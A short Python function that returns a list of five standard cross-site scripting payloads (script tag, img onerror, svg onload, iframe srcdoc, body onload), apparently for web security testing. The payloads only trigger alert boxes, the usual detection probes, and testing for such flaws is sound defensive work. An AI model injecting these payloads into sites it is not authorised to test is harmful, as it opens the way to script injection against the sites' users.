def generate_xss_payloads():
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<body onload=alert('XSS')>"
    ]
